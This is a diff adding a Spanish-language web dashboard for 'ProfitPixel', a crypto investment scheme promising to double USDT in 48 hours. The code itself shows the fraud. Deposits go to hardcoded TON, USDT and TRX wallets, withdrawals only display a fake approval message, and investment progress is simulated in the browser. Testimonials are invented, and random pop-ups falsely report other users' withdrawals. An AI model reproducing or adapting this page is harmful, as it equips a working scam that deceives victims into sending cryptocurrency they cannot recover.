@@ -1,0 +1,427 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ProfitPixel - Panel de Control</title>
+    <style>
+        body {
+            font-family: 'Arial', sans-serif;
+            background-color: #1a1a1a;
+            color: #ffffff;
+            margin: 0;
+            padding: 20px;
+        }
+        .dashboard {
+            background-color: #2c2c2c;
+            padding: 30px;
+            border-radius: 8px;
+            text-align: center;
+            width: 90%;
+            max-width: 600px;
+            margin: auto;
+        }
+        h1 {
+            font-size: 2em;
+            color: #4caf50;
+        }
+        .buttons {
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+            margin: 20px 0;
+        }
+        button {
+            background-color: #4caf50;
+            color: #ffffff;
+            padding: 12px;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 1em;
+            transition: background-color 0.3s;
+        }
+        button:hover {
+            background-color: #388e3c;
+        }
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.5);
+            justify-content: center;
+            align-items: center;
+        }
+        .modal-content {
+            background-color: #2c2c2c;
+            color: #ffffff;
+            padding: 20px;
+            border-radius: 8px;
+            width: 90%;
+            max-width: 400px;
+            text-align: center;
+        }
+        .modal-content input, .modal-content select {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #4caf50;
+            border-radius: 4px;
+            background-color: #3c3c3c;
+            color: #ffffff;
+        }
+        .error {
+            color: #f44336;
+            font-size: 0.9em;
+        }
+        .investment {
+            margin: 20px 0;
+            background-color: #3c3c3c;
+            padding: 15px;
+            border-radius: 4px;
+            display: none;
+            text-align: left;
+        }
+        .investment h2 {
+            color: #4caf50;
+            margin-bottom: 10px;
+        }
+        .investment p {
+            font-size: 1.1em;
+            line-height: 1.5;
+        }
+        .investment .logo {
+            vertical-align: middle;
+            margin-right: 8px;
+        }
+        .investment .amount {
+            color: #4caf50;
+            margin-right: 8px;
+        }
+        .investment .progress {
+            color: #2196f3;
+            margin-right: 8px;
+        }
+        .investment .status {
+            color: #ff9800;
+            margin-right: 8px;
+        }
+        .investment .time {
+            color: #aaaaaa;
+        }
+        .referral {
+            margin: 20px 0;
+            display: none;
+        }
+        .referral p {
+            word-break: break-all;
+        }
+        .referral button {
+            background-color: #2196f3;
+            margin-top: 10px;
+        }
+        .referral button:hover {
+            background-color: #1976d2;
+        }
+        .notification {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            background-color: #4caf50;
+            color: #ffffff;
+            padding: 10px;
+            border-radius: 4px;
+            font-size: 0.9em;
+            opacity: 0;
+            transition: opacity 0.5s ease;
+        }
+        .notification.show {
+            opacity: 1;
+        }
+        .telegram-button {
+            position: fixed;
+            bottom: 40px;
+            left: 20px;
+            width: 50px;
+            height: 50px;
+            cursor: pointer;
+            display: block;
+        }
+        .telegram-button svg {
+            width: 100%;
+            height: 100%;
+            transition: filter 0.3s;
+        }
+        .telegram-button:hover svg circle {
+            fill: #1A8CCB; /* Oscurece el círculo al hacer hover */
+        }
+        .testimonials {
+            margin: 20px 0;
+            text-align: left;
+        }
+        .testimonials h2 {
+            color: #4caf50;
+            margin-bottom: 10px;
+        }
+        .testimonials p {
+            background-color: #3c3c3c;
+            padding: 10px;
+            border-radius: 4px;
+            margin: 5px 0;
+            font-size: 0.9em;
+        }
+        .footer {
+            margin-top: 20px;
+            font-size: 0.9em;
+            color: #aaaaaa;
+            text-align: center;
+        }
+        .footer a {
+            color: #4caf50;
+            text-decoration: none;
+            margin: 0 10px;
+        }
+        .footer .secure {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 5px;
+            margin-top: 10px;
+        }
+        .footer .secure::before {
+            content: '🔒';
+        }
+    </style>
+</head>
+<body>
+    <div class="dashboard">
+        <h1>ProfitPixel - Panel</h1>
+        <div class="buttons">
+            <button onclick="toggleInvestment()">Mi Inversión</button>
+            <button onclick="showDepositModal()">Depositar</button>
+            <button onclick="showWithdrawModal()">Retirar</button>
+            <button onclick="showReferrals()">Mis Referidos</button>
+        </div>
+        <div id="investment" class="investment">
+            <h2>Mi Inversión</h2>
+            <p id="investmentInfo"></p>
+        </div>
+        <div id="referrals" class="referral">
+            <h2>Mis Referidos</h2>
+            <p>Enlace de Referido: <span id="referralLink"></span></p>
+            <button onclick="copyReferralLink()">Copiar Enlace</button>
+            <p>Tus Referidos: <span id="referralCount">0</span></p>
+        </div>
+        <div class="testimonials">
+            <h2>Testimonios</h2>
+            <p>"¡Dupliqué mis 50 USDT en 48 horas! Gran plataforma." - Carlos G.</p>
+            <p>"Fácil de usar y resultados rápidos. ¡Recomendado!" - Ana M.</p>
+            <p>"El soporte en Telegram es súper útil." - Luis R.</p>
+        </div>
+        <div class="footer">
+            <p>Usuarios Activos: <span id="activeUsers">1274</span></p>
+            <div class="secure">Plataforma Segura</div>
+            <a href="#">Términos y Condiciones</a> | <a href="#">Política de Privacidad</a>
+        </div>
+    </div>
+    <div id="depositModal" class="modal">
+        <div class="modal-content">
+            <h2>Depositar</h2>
+            <input type="number" id="depositAmount" placeholder="Monto a depositar (mín. 5 USDT)">
+            <button onclick="confirmDeposit()">Confirmar Monto</button>
+            <p id="depositError" class="error"></p>
+        </div>
+    </div>
+    <div id="walletModal" class="modal">
+        <div class="modal-content">
+            <h2>Enviar Depósito</h2>
+            <p>Deposita el monto en una de las siguientes billeteras:</p>
+            <p><strong>TON:</strong> UQAU4vdwVqquE4n7MmPxp7gX22r79phDPNX0gzDw9c1BkpMF</p>
+            <p><strong>USDT (BEP-20):</strong> 0xEc53dFEA7c492302C4C03414Cd040851A383fdFe</p>
+            <p><strong>TRX:</strong> TJiL3TtBBkXh5g5BXz8jT6VStGhU3QFYRJ</p>
+            <button onclick="confirmPayment()">Confirmar Pago</button>
+        </div>
+    </div>
+    <div id="paymentConfirmModal" class="modal">
+        <div class="modal-content">
+            <h2>Confirmación</h2>
+            <p>Su pago será verificado en 1-2 minutos.</p>
+            <button onclick="closeModals()">Cerrar</button>
+        </div>
+    </div>
+    <div id="withdrawModal" class="modal">
+        <div class="modal-content">
+            <h2>Retirar</h2>
+            <input type="text" id="withdrawAddress" placeholder="Dirección USDT (BEP-20)">
+            <input type="number" id="withdrawAmount" placeholder="Monto a retirar (mín. 5 USDT)">
+            <button onclick="confirmWithdraw()">Confirmar Retiro</button>
+            <p id="withdrawError" class="error"></p>
+        </div>
+    </div>
+    <div id="withdrawConfirmModal" class="modal">
+        <div class="modal-content">
+            <h2>Confirmación</h2>
+            <p>Su retiro será aprobado en 5-10 minutos.</p>
+            <button onclick="closeModals()">Cerrar</button>
+        </div>
+    </div>
+    <div id="notification" class="notification"></div>
+    <a href="https://t.me/ProfiPixel" class="telegram-button">
+        <svg viewBox="0 0 512 512" role="img" aria-label="Logo estilo Telegram">
+            <defs>
+                <filter id="shadow" x="-20%" y="-20%" width="140%" height="140%">
+                    <feDropShadow dx="0" dy="6" stdDeviation="10" flood-opacity="0.18"/>
+                </filter>
+            </defs>
+            <g filter="url(#shadow)">
+                <circle cx="256" cy="256" r="240" fill="#2AABEE"/>
+            </g>
+            <path d="M118 255 L418 106 L349 409 L257 330 L200 380 L192 268 Z" fill="#FFFFFF"/>
+            <path d="M418 106 L257 330 L233 306 L350 214 Z" fill="#D8ECFF" opacity="0.9"/>
+            <path d="M118 255 L206 287 L192 268 Z" fill="#D8ECFF" opacity="0.9"/>
+        </svg>
+    </a>
+    <script>
+        let investedAmount = parseFloat(localStorage.getItem('investedAmount')) || 0;
+        let depositTime = parseInt(localStorage.getItem('depositTime')) || 0;
+
+        function drawUsdtLogo(canvasId) {
+            const canvas = document.getElementById(canvasId);
+            const ctx = canvas.getContext('2d');
+            ctx.clearRect(0, 0, 32, 32);
+            ctx.fillStyle = '#26A17B';
+            for (let y = 0; y < 32; y++) {
+                for (let x = 0; x < 32; x++) {
+                    const dx = x - 16;
+                    const dy = y - 16;
+                    if (dx * dx + dy * dy <= 225) {
+                        ctx.fillRect(x, y, 1, 1);
+                    }
+                }
+            }
+            ctx.fillStyle = '#ffffff';
+            ctx.fillRect(8, 8, 16, 2);
+            ctx.fillRect(14, 10, 4, 14);
+            ctx.fillRect(10, 22, 12, 2);
+            ctx.fillRect(8, 20, 2, 2);
+            ctx.fillRect(22, 20, 2, 2);
+        }
+
+        function updateInvestmentProgress() {
+            if (depositTime && investedAmount > 0) {
+                const now = Date.now();
+                const elapsed = (now - depositTime) / 1000;
+                const totalTime = 48 * 3600;
+                let progress = Math.min((elapsed / totalTime) * 100, 100).toFixed(1);
+                let status = progress >= 100 ? 'Terminado' : 'En Curso';
+                if (document.getElementById('investment').style.display === 'block') {
+                    const info = document.getElementById('investmentInfo');
+                    info.innerHTML = '';
+                    const canvas = document.createElement('canvas');
+                    canvas.id = 'usdtLogo';
+                    canvas.width = 32;
+                    canvas.height = 32;
+                    canvas.className = 'logo';
+                    info.appendChild(canvas);
+                    drawUsdtLogo('usdtLogo');
+                    info.innerHTML += `<span class="amount">${investedAmount}</span> USDT <span class="progress">${progress}%</span> <span class="status">${status}</span> <span class="time">${Math.max(0, Math.floor((totalTime - elapsed) / 3600))} horas restantes</span>`;
+                }
+            }
+        }
+        setInterval(updateInvestmentProgress, 1000);
+
+        function showNotification() {
+            const emails = [
+                'juan.perez@gmail.com', 'maria.lopez@gmail.com', 'crypto_king@gmail.com',
+                'ana.garcia@gmail.com', 'pedro.sanchez@gmail.com', 'luna.star@gmail.com'
+            ];
+            const amounts = [10, 25, 50, 100, 200, 350, 500];
+            const intervals = [5000, 10000, 15000, 20000, 30000, 40000, 50000];
+            const email = emails[Math.floor(Math.random() * emails.length)];
+            const amount = amounts[Math.floor(Math.random() * amounts.length)];
+            const notification = document.getElementById('notification');
+            notification.textContent = `${email} ha retirado ${amount} USDT`;
+            notification.classList.add('show');
+            setTimeout(() => {
+                notification.classList.remove('show');
+            }, 3000);
+            const nextInterval = intervals[Math.floor(Math.random() * intervals.length)];
+            setTimeout(showNotification, nextInterval);
+        }
+
+        function showDepositModal() {
+            document.getElementById('depositModal').style.display = 'flex';
+        }
+        function confirmDeposit() {
+            const amount = parseFloat(document.getElementById('depositAmount').value);
+            const error = document.getElementById('depositError');
+            if (!amount || amount < 5) {
+                error.textContent = 'El monto mínimo es 5 USDT';
+                return;
+            }
+            investedAmount = amount;
+            depositTime = Date.now();
+            localStorage.setItem('investedAmount', amount);
+            localStorage.setItem('depositTime', depositTime);
+            document.getElementById('depositModal').style.display = 'none';
+            document.getElementById('walletModal').style.display = 'flex';
+        }
+        function confirmPayment() {
+            document.getElementById('walletModal').style.display = 'none';
+            document.getElementById('paymentConfirmModal').style.display = 'flex';
+        }
+        function showWithdrawModal() {
+            document.getElementById('withdrawModal').style.display = 'flex';
+        }
+        function confirmWithdraw() {
+            const address = document.getElementById('withdrawAddress').value;
+            const amount = parseFloat(document.getElementById('withdrawAmount').value);
+            const error = document.getElementById('withdrawError');
+            if (!address) {
+                error.textContent = 'La dirección es obligatoria';
+                return;
+            }
+            if (!amount || amount < 5) {
+                error.textContent = 'El monto mínimo es 5 USDT';
+                return;
+            }
+            document.getElementById('withdrawModal').style.display = 'none';
+            document.getElementById('withdrawConfirmModal').style.display = 'flex';
+        }
+        function closeModals() {
+            document.querySelectorAll('.modal').forEach(modal => modal.style.display = 'none');
+        }
+        function toggleInvestment() {
+            const investment = document.getElementById('investment');
+            if (investment.style.display === 'block') {
+                investment.style.display = 'none';
+            } else {
+                investment.style.display = 'block';
+                updateInvestmentProgress();
+                document.getElementById('referrals').style.display = 'none';
+            }
+        }
+        function showReferrals() {
+            document.getElementById('referrals').style.display = 'block';
+            document.getElementById('investment').style.display = 'none';
+            const email = localStorage.getItem('userEmail');
+            const code = localStorage.getItem('referralCode');
+            const referralLink = `https://profitpixel.com/referral/${code}`;
+            document.getElementById('referralLink').textContent = referralLink;
+            document.getElementById('referralCount').textContent = '0';
+        }
+        function copyReferralLink() {
+            const referralLink = document.getElementById('referralLink').textContent;
+            navigator.clipboard.writeText(referralLink).then(() => {
+                alert('Enlace de referido copiado al portapapeles');
+            });
+        }
+
+        document.getElementById('activeUsers').textContent = Math.floor(Math.random() * 100 + 1200);
+        showNotification();
+    </script>
+</body>
+  </html>
